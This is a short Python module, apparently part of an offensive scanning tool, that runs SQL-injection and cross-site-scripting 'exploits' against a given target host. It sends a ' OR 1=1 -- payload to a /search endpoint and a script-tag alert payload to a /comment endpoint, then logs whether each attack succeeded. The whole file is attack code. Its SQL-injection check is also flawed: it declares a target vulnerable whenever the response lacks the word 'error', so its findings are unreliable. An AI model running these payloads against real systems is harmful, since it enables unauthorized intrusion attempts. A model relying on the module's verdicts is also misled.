import requests
from utils.logger import setup_logger
from utils.http_tools import simple_get

log = setup_logger()

def run(target, ex_type, config):
    log.info(f"Running {ex_type} exploitation on {target}")
    
    if ex_type == "sqli":
        result = sqli_exploit(target)
    elif ex_type == "xss":
        result = xss_exploit(target)
    else:
        log.error(f"Exploit type {ex_type} not supported.")
        return
    
    if result:
        log.info(f"Exploit successful: {result}")
    else:
        log.info("Exploit failed or not applicable.")

def sqli_exploit(target):
    sqli_payload = "' OR 1=1 --"
    url = f"http://{target}/search?query={sqli_payload}"
    
    try:
        response = requests.get(url, timeout=5)
        if "error" in response.text.lower():
            return None
        return f"SQLi vulnerable on {url}"
    except Exception as e:
        log.error(f"SQLi exploit failed on {target}: {e}")
        return None

def xss_exploit(target):
    xss_payload = "<script>alert('XSS')</script>"
    url = f"http://{target}/comment?text={xss_payload}"
    
    try:
        response = requests.get(url, timeout=5)
        if xss_payload in response.text:
            return f"XSS vulnerability found on {url}"
        return None
    except Exception as e:
        log.error(f"XSS exploit failed on {target}: {e}")
        return None
